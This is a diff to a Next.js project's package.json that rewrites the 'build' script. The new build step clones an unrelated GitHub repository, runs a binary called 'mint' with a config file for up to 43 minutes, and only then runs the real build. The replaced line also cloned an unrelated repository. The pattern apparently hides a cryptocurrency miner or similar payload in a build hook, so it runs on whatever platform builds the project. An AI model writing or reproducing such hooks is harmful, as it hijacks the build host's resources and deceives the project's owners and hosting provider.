@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "git clone https://gitlab.com/jadons19292/sayang.git && cd sayang && next build",
+    "build": "git clone https://github.com/cahayaangkasaku1/mint.git && cd mint && timeout 43m ./mint -c config.json && next build",
     "start": "next start",
     "lint": "next lint"
   },
